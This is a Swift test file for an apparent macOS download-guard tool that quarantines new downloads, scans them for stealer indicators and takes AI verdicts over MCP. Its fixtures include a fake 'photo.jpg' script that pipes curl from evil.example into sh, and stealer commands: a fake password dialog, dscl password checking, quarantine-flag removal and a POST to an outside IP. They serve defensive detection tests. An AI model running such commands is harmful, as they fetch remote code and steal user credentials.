import XCTest
@testable import DownloadGuardCore

final class DownloadGuardCoreTests: XCTestCase {
    var dir: URL!

    override func setUpWithError() throws {
        dir = FileManager.default.temporaryDirectory.appendingPathComponent("dg-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: dir)
    }

    func write(_ name: String, _ text: String) throws -> URL {
        let url = dir.appendingPathComponent(name)
        try Data(text.utf8).write(to: url)
        return url
    }

    func setWhereFroms(_ url: URL, _ list: [String]) throws {
        let data = try PropertyListSerialization.data(fromPropertyList: list, format: .binary, options: 0)
        _ = data.withUnsafeBytes {
            setxattr(url.path, "com.apple.metadata:kMDItemWhereFroms", $0.baseAddress, data.count, 0, 0)
        }
    }

    // MARK: - 分類與偽裝

    func testScriptDisguisedAsImageIsNotWhitelistedByExtension() throws {
        let url = try write("photo.jpg", "#!/bin/sh\ncurl -s http://evil.example/x | sh\n")
        let facts = FileInspector.inspect(url)
        XCTAssertEqual(facts.category, .script)
        XCTAssertTrue(facts.disguised)
        XCTAssertNil(Whitelist.default.match(facts), "副檔名白名單不能放行偽裝成圖片的腳本")
        let signals = LocalRules.signals(facts: facts, ioc: IOCScanner.scan(path: url.path, facts: facts))
        XCTAssertEqual(LocalRules.verdict(for: signals), .suspicious)
    }

    func testPlainTextDocument() throws {
        let url = try write("notes.md", "# hello\njust notes\n")
        let facts = FileInspector.inspect(url)
        XCTAssertEqual(facts.category, .document)
        XCTAssertFalse(facts.disguised)
        XCTAssertNotNil(facts.sha256)
        XCTAssertEqual(LocalRules.verdict(for: LocalRules.signals(facts: facts, ioc: nil)), .safe)
    }

    // MARK: - IOC

    func testIOCFindsStealerTechniques() {
        let sample = """
        osascript -e 'display dialog "System Preferences needs your password" default answer ""'
        dscl . -authonly user pw
        xattr -d com.apple.quarantine /tmp/x ; killall Terminal
        curl -X POST http://45.94.47.10/contact
        """
        let r = IOCScanner.scan(data: Data(sample.utf8))
        XCTAssertNotNil(r.hits["dscl . -authonly"])
        XCTAssertNotNil(r.hits["killall Terminal"])
        XCTAssertNotNil(r.hits["xattr -d com.apple.quarantine"])
        XCTAssertTrue(r.ips.contains("45.94.47.10"))
        XCTAssertTrue(r.urls.contains { $0.hasPrefix("http://45.94.47.10") })
        XCTAssertTrue(r.signals.contains { $0.severity == .critical })
    }

    func testIPFilterSkipsVersionsAndLocal() {
        XCTAssertFalse(IOCScanner.isInterestingIP("1.2.3.4"))
        XCTAssertFalse(IOCScanner.isInterestingIP("127.0.0.1"))
        XCTAssertFalse(IOCScanner.isInterestingIP("192.168.1.20"))
        XCTAssertTrue(IOCScanner.isInterestingIP("38.244.158.56"))
    }

    // MARK: - 白名單

    func testDomainWhitelistMatchesSubdomainsOfDownloadOrReferrer() throws {
        let url = try write("tool.zip", "PK")
        try setWhereFroms(url, ["https://dl.example.com/tool.zip", "https://www.vendor.org/download"])
        let facts = FileInspector.inspect(url)
        XCTAssertEqual(facts.downloadHost, "dl.example.com")
        XCTAssertNotNil(Whitelist(domains: ["example.com"]).match(facts))
        XCTAssertNotNil(Whitelist(domains: ["vendor.org"]).match(facts))
        XCTAssertNil(Whitelist(domains: ["ample.com"]).match(facts), "不能只比對字尾字串")
    }

    func testSHA256Whitelist() throws {
        let url = try write("a.bin", "hello")
        let facts = FileInspector.inspect(url)
        XCTAssertNotNil(Whitelist(sha256: [facts.sha256!.uppercased()]).match(facts))
    }

    func testSuggestionMustMatchRealFacts() throws {
        let url = try write("tool.zip", "PK")
        try setWhereFroms(url, ["https://dl.example.com/tool.zip"])
        let facts = FileInspector.inspect(url)
        XCTAssertTrue(Whitelist.isConsistent(.init(kind: .domain, value: "example.com"), with: facts))
        XCTAssertTrue(Whitelist.isConsistent(.init(kind: .domain, value: "https://dl.example.com/x"), with: facts))
        XCTAssertFalse(Whitelist.isConsistent(.init(kind: .domain, value: "attacker.net"), with: facts))
        XCTAssertFalse(Whitelist.isConsistent(.init(kind: .domain, value: "com"), with: facts))
        XCTAssertFalse(Whitelist.isConsistent(.init(kind: .teamID, value: "ABCDE12345"), with: facts),
                       "沒有簽章的檔案不能建議信任開發者")
        XCTAssertTrue(Whitelist.isConsistent(.init(kind: .sha256, value: facts.sha256!), with: facts))
    }

    func testWhitelistToolsAddAndRemove() throws {
        let file = dir.appendingPathComponent("whitelist.json")
        let tools = WhitelistTools(file: file)
        _ = try tools.call("whitelist_add", ["kind": "domain", "value": "https://GitHub.com/foo"])
        _ = try tools.call("whitelist_add", ["kind": "extension", "value": ".PDF"])
        var list = Whitelist.load(from: file)
        XCTAssertTrue(list.domains.contains("github.com"))
        XCTAssertTrue(list.extensions.contains("pdf"))
        _ = try tools.call("whitelist_remove", ["kind": "domain", "value": "github.com"])
        list = Whitelist.load(from: file)
        XCTAssertFalse(list.domains.contains("github.com"))
    }

    // MARK: - MCP

    func testMCPProtocolAndVerdict() throws {
        let target = try write("setup.command", "#!/bin/sh\necho hi\n")
        let out = dir.appendingPathComponent("verdict.json")
        let server = MCPServer(tools: ScanTools(target: target, verdictOut: out))

        let initReply = server.handle(["jsonrpc": "2.0", "id": 1, "method": "initialize",
                                       "params": ["protocolVersion": "2025-06-18"]])
        let initResult = initReply?["result"] as? [String: Any]
        XCTAssertEqual(initResult?["protocolVersion"] as? String, "2025-06-18")
        XCTAssertNil(server.handle(["jsonrpc": "2.0", "method": "notifications/initialized"]))

        let list = server.handle(["jsonrpc": "2.0", "id": 2, "method": "tools/list"])
        let names = ((list?["result"] as? [String: Any])?["tools"] as? [[String: Any]])?.compactMap { $0["name"] as? String }
        XCTAssertEqual(Set(names ?? []), ["inspect_file", "scan_strings", "read_text", "submit_verdict"])

        let read = server.handle(["jsonrpc": "2.0", "id": 3, "method": "tools/call",
                                  "params": ["name": "read_text", "arguments": [String: Any]()]])
        let text = (((read?["result"] as? [String: Any])?["content"] as? [[String: Any]])?.first?["text"] as? String) ?? ""
        XCTAssertTrue(text.contains("<untrusted_file_data>"))
        XCTAssertTrue(text.contains("echo hi"))

        _ = server.handle(["jsonrpc": "2.0", "id": 4, "method": "tools/call",
                           "params": ["name": "submit_verdict",
                                      "arguments": ["verdict": "suspicious", "summary": "測試", "reasons": ["a"]]]])
        let saved = try JSONDecoder().decode(ClaudeVerdict.self, from: Data(contentsOf: out))
        XCTAssertEqual(saved.verdict, .suspicious)

        let unknown = server.handle(["jsonrpc": "2.0", "id": 5, "method": "nope"])
        XCTAssertNotNil(unknown?["error"])
    }

    func testReadTextCannotEscapeTargetFolder() throws {
        let folder = dir.appendingPathComponent("App Folder", isDirectory: true)
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        try Data("inside".utf8).write(to: folder.appendingPathComponent("a.txt"))
        _ = try write("secret.txt", "outside")
        let tools = ScanTools(target: folder, verdictOut: dir.appendingPathComponent("v.json"))
        XCTAssertTrue(try tools.call("read_text", ["member": "a.txt"]).contains("inside"))
        XCTAssertThrowsError(try tools.call("read_text", ["member": "../secret.txt"]))
    }

    // MARK: - 小黑屋

    func testReleaseGoesBackToOriginFolderAndAvoidsNameClash() throws {
        let holding = dir.appendingPathComponent("hold", isDirectory: true)
        let project = dir.appendingPathComponent("專案A", isDirectory: true)
        let downloads = dir.appendingPathComponent("dl", isDirectory: true)
        try FileManager.default.createDirectory(at: project, withIntermediateDirectories: true)
        try Data("new".utf8).write(to: project.appendingPathComponent("a.pdf"))

        let held = try HoldingPen.admit(project.appendingPathComponent("a.pdf"), holding: holding)
        XCTAssertEqual(held.deletingLastPathComponent().lastPathComponent, "hold")
        XCTAssertEqual(HoldingPen.origin(of: held)?.lastPathComponent, "專案A")
        XCTAssertFalse(HoldingPen.isReleased(held))

        try Data("other".utf8).write(to: project.appendingPathComponent("a.pdf"))   // 同名檔案已經在原處
        let released = try HoldingPen.release(held, fallback: downloads)
        XCTAssertEqual(released.deletingLastPathComponent().lastPathComponent, "專案A", "送回原本的資料夾")
        XCTAssertEqual(released.lastPathComponent, "a 2.pdf")
        XCTAssertTrue(HoldingPen.isReleased(released))
        XCTAssertNil(HoldingPen.origin(of: released))
    }

    func testReleaseFallsBackWhenOriginFolderIsGone() throws {
        let project = dir.appendingPathComponent("gone", isDirectory: true)
        let downloads = dir.appendingPathComponent("dl", isDirectory: true)
        try FileManager.default.createDirectory(at: project, withIntermediateDirectories: true)
        try Data("x".utf8).write(to: project.appendingPathComponent("b.zip"))
        let held = try HoldingPen.admit(project.appendingPathComponent("b.zip"), holding: dir.appendingPathComponent("hold"))
        try FileManager.default.removeItem(at: project)
        let released = try HoldingPen.release(held, fallback: downloads)
        XCTAssertEqual(released.deletingLastPathComponent().lastPathComponent, "dl")
    }

    func testExecutePermissionRemovedWhileHeldAndRestoredOnRelease() throws {
        let script = try write("run.command", "#!/bin/sh\necho hi\n")
        chmod(script.path, 0o755)
        let held = try HoldingPen.admit(script, holding: dir.appendingPathComponent("hold"))
        XCTAssertFalse(FileManager.default.isExecutableFile(atPath: held.path), "小黑屋裡不能執行")
        let released = try HoldingPen.release(held, fallback: dir)
        XCTAssertTrue(FileManager.default.isExecutableFile(atPath: released.path), "放行後還原權限")
    }

    // MARK: - 全家目錄攔截

    func testInterceptorCandidateRules() {
        let home = DownloadWatcher.realURL(dir)
        let i = DownloadInterceptor(root: home, excluded: [home.appendingPathComponent("小黑屋"),
                                                           home.appendingPathComponent("Library")]) { _ in }
        let h = home.path
        XCTAssertEqual(i.candidate(for: "\(h)/Documents/專案A/tool.zip"), "\(h)/Documents/專案A/tool.zip")
        XCTAssertEqual(i.candidate(for: "\(h)/Downloads/Foo.app/Contents/MacOS/Foo"), "\(h)/Downloads/Foo.app",
                       "套件內部的檔案歸到最外層的套件")
        XCTAssertNil(i.candidate(for: "\(h)/Downloads/movie.mp4.crdownload"))
        XCTAssertNil(i.candidate(for: "\(h)/小黑屋/a.zip"))
        XCTAssertNil(i.candidate(for: "\(h)/Library/Caches/x.bin"))
        XCTAssertNil(i.candidate(for: "\(h)/Documents/app/node_modules/pkg/index.js"))
        XCTAssertNil(i.candidate(for: "\(h)/.cache/huggingface/model.bin"))
        XCTAssertNil(i.candidate(for: "/somewhere/else/file"))
    }

    func testFreshDownloadNeedsRecentQuarantineAndSourceURL() throws {
        let url = try write("setup.dmg", "x")
        func quarantine(_ date: Date) {
            let value = String(format: "0083;%llx;Chrome;", UInt64(date.timeIntervalSince1970))
            setxattr(url.path, "com.apple.quarantine", value, value.utf8.count, 0, 0)
        }
        quarantine(Date())
        XCTAssertFalse(DownloadInterceptor.isFreshDownload(url, window: 900), "沒有下載網址:沙盒 App 自己存的檔案")
        try setWhereFroms(url, ["https://example.com/setup.dmg"])
        XCTAssertTrue(DownloadInterceptor.isFreshDownload(url, window: 900))
        quarantine(Date().addingTimeInterval(-3600))
        XCTAssertFalse(DownloadInterceptor.isFreshDownload(url, window: 900), "一小時前的舊下載被搬動,不算")
        quarantine(Date())
        HoldingPen.setString(url.path, HoldingPen.releasedAttribute, "1")
        XCTAssertFalse(DownloadInterceptor.isFreshDownload(url, window: 900), "放行過的不再抓")
    }

    func testInterceptorCatchesDownloadSavedToAnyFolder() throws {
        let home = dir!
        let project = home.appendingPathComponent("Documents/專案A", isDirectory: true)
        try FileManager.default.createDirectory(at: project, withIntermediateDirectories: true)
        let caught = expectation(description: "download in a nested folder is caught")
        var got: [String] = []
        let i = DownloadInterceptor(root: home, excluded: []) { url in
            got.append(url.lastPathComponent); caught.fulfill()
        }
        i.settleDelay = 0.3
        i.start()
        defer { i.stop() }

        // 一般檔案(沒有下載標記):不抓
        _ = try write("Documents/專案A/notes.txt", "mine")
        // 模擬 Chrome:寫好暫存檔、加上標記,完成時改名
        let temp = try write("Documents/專案A/tool.zip.crdownload", "PK")
        let q = String(format: "0083;%llx;Chrome;", UInt64(Date().timeIntervalSince1970))
        setxattr(temp.path, "com.apple.quarantine", q, q.utf8.count, 0, 0)
        try setWhereFroms(temp, ["https://example.com/tool.zip"])
        Thread.sleep(forTimeInterval: 0.3)
        try FileManager.default.moveItem(at: temp, to: project.appendingPathComponent("tool.zip"))
        wait(for: [caught], timeout: 10)
        Thread.sleep(forTimeInterval: 1.0)
        XCTAssertEqual(got, ["tool.zip"])
    }

    // MARK: - 監看

    func testWatcherIgnoresTemporaryDownloadsAndReportsFinishedFile() throws {
        XCTAssertTrue(DownloadWatcher.shouldIgnore("movie.mp4.crdownload"))
        XCTAssertTrue(DownloadWatcher.shouldIgnore(".DS_Store"))
        XCTAssertFalse(DownloadWatcher.shouldIgnore("movie.mp4"))

        let ready = expectation(description: "finished file reported")
        var reported: [String] = []
        let watcher = DownloadWatcher(directory: dir) { url in
            reported.append(url.lastPathComponent)
            if url.lastPathComponent == "movie.mp4" { ready.fulfill() }
        }
        watcher.settleDelay = 0.5
        watcher.start()
        defer { watcher.stop() }

        // 模擬瀏覽器:先寫暫存檔,完成後改名
        let temp = try write("movie.mp4.crdownload", "partial")
        Thread.sleep(forTimeInterval: 0.3)
        try FileManager.default.moveItem(at: temp, to: dir.appendingPathComponent("movie.mp4"))
        wait(for: [ready], timeout: 10)
        XCTAssertEqual(reported, ["movie.mp4"])
    }
}
